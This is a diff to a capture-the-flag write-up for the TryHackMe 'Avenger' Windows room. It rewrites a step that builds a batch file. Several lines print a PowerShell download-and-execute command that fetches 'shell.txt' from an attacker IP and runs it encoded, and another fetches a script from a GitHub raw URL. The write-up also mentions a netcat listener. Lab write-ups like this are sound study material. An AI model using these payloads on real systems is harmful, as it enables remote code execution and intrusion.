@@ -3,11 +3,8 @@
 ## Room Information
 
 - **Platform:** TryHackMe
-- 
 - **Room:** Avenger
-- 
 - **Difficulty:** Medium
-- 
 - **OS:** Windows
 
 
@@ -106,8 +103,6 @@ curl http://avenger.tryhackme/gift/ | grep -i "form_id"
 
 **Form ID: 1176**
 
-The room description mentioned a simulated user reviews every submission — this hinted at a client-side execution attack via file upload.
-
 ---
 
 ## Step 6 — PHP Webshell Upload (Unsuccessful)
@@ -177,8 +172,11 @@ pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githu
 **Create the bat file:**
 
 ```bash
-echo "START /B powershell -c \$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.214.121:8000/shell.txt');iex 'powershell -E \$code'" > ironman.bat
-unix2dos ironman.bat
+cat > /tmp/ironman.bat << 'EOF'
+START /B powershell -NonInteractive -c $stark=(New-Object System.Net.Webclient).DownloadString('http://192.168.214.121:8000/shell.txt');iex 'powershell -EncodedCommand $stark'
+EOF
+unix2dos /tmp/ironman.bat
+cat /tmp/ironman.bat
 ```
 
 **Start HTTP server and netcat listener:**
